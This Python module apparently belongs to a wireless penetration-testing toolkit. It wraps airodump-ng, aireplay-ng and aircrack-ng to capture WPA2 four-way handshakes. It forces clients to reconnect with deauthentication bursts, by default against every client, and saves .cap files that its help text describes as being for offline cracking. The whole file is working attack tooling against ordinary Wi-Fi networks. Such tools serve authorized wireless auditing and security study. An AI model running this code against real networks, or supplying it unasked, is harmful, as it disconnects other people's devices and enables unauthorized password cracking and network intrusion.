import os
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp
from typing import AsyncGenerator


HELP = ToolHelp(
    name="Handshake Capture",
    description="Captures WPA2 4-way handshake by sending deauth packets to force client reconnection. Saves .cap file for offline cracking.",
    usage="Requires: target BSSID, channel, client MAC (optional but faster), monitor interface.",
    danger_note="🟠 Medium Risk — sends deauth frames, briefly disconnects clients from target AP.",
    example="airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
)

DANGER = DangerLevel.ORANGE


class HandshakeCapture:
    def __init__(self, interface: str = "wlan0mon", output_dir: str = "/tmp"):
        self.interface = interface
        self.output_dir = output_dir
        self._capture_runner = CommandRunner()
        self._deauth_runner = CommandRunner()

    async def capture(
        self,
        bssid: str,
        channel: str,
        output_name: str = "handshake",
    ) -> AsyncGenerator[str, None]:
        out_path = os.path.join(self.output_dir, output_name)
        yield f"[*] Targeting {bssid} on channel {channel}"
        yield f"[*] Saving capture to {out_path}-01.cap"
        yield "[*] Waiting for handshake — trigger deauth from Deauth module..."

        async for line in self._capture_runner.run([
            "airodump-ng",
            "-c", channel,
            "--bssid", bssid,
            "-w", out_path,
            "--output-format", "cap",
            self.interface,
        ]):
            if "WPA handshake" in line:
                yield f"[+] HANDSHAKE CAPTURED! {line}"
            else:
                yield line

    async def deauth_burst(
        self,
        bssid: str,
        client: str = "FF:FF:FF:FF:FF:FF",
        count: int = 5,
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Sending {count} deauth frames → {bssid} (client: {client})"
        async for line in self._deauth_runner.run([
            "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
            "-c", client,
            self.interface,
        ]):
            yield line

    async def verify_cap(self, cap_path: str) -> AsyncGenerator[str, None]:
        yield f"[*] Verifying handshake in {cap_path}..."
        async for line in CommandRunner().run([
            "aircrack-ng", cap_path
        ]):
            if "WPA" in line or "handshake" in line.lower():
                yield f"[+] {line}"
            else:
                yield line

    async def stop(self):
        await self._capture_runner.stop()
        await self._deauth_runner.stop()
